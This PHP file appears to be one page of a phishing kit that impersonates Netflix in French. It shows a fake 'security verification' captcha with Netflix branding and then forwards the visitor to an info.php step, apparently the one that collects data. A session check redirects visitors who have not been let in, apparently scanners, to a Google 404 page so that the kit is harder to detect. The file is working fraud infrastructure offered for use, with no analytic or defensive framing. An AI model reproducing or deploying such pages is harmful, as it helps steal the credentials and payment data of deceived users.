<?php
session_start();
include "./zebi/config.php";
include "./zebi/functions.php";


if ($_SESSION['allow'] != "yes") {
    header('location: https://google.com/404');
    exit();
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validate the captcha input
    $captcha_input = isset($_POST['captcha']) ? $_POST['captcha'] : '';
    $correct_captcha = isset($_SESSION['captcha_code']) ? $_SESSION['captcha_code'] : '';

    if (strtolower($captcha_input) === strtolower($correct_captcha)) {
        $_SESSION['captcha_verified'] = true;
        header('Location: info.php');
        exit();
    } else {

        $error_message = "Code de vérification incorrect. Veuillez réessayer.";
    }
}

// Generate a new captcha code for the page
$_SESSION['captcha_code'] = substr(md5(mt_rand()), 0, 6); // Generate a 6-character alphanumeric code
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de Sécurité - Netflix</title>
    <link rel="icon" href="files/img/nficon2025.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: url('files/img/back.jpg');
            background-size: cover;
            background-position: center;
            color: #fff;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
        }
        h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .captcha-image {
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 20px;
            display: inline-block;
            font-size: 30px;
            font-weight: bold;
            color: #333;
            letter-spacing: 5px;
            border-radius: 4px;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
            font-size: 16px;
        }
        button {
            background-color: #e50914;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 18px;
            width: 100%;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #f40612;
        }
        .error-message {
            color: #ffcc00;
            margin-top: 15px;
            font-size: 14px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #aaa;
        }
        .footer a {
            color: #aaa;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="files/img/Logonetflix.png" alt="Netflix Logo">
        </div>
        <h2>Vérification de Sécurité</h2>
        <p>Veuillez entrer le code affiché ci-dessous pour continuer.</p>
        <div class="captcha-image">
            <?php echo $_SESSION['captcha_code']; ?>
        </div>
        <form action="" method="post">
            <input type="text" name="captcha" placeholder="Entrez le code" required autocomplete="off">
            <button type="submit">Vérifier</button>
        </form>
        <?php if (isset($error_message)): ?>
            <p class="error-message"><?php echo $error_message; ?></p>
        <?php endif; ?>
        <div class="footer">
            <p>Des questions ? Appelez le 0800-800-800</p>
            <p>
                <a href="#">FAQ</a>
                <a href="#">Centre d'aide</a>
                <a href="#">Conditions d'utilisation</a>
                <a href="#">Confidentialité</a>
                <a href="#">Préférences de cookies</a>
                <a href="#">Informations sur l'entreprise</a>
            </p>
        </div>
    </div>
</body>
</html>
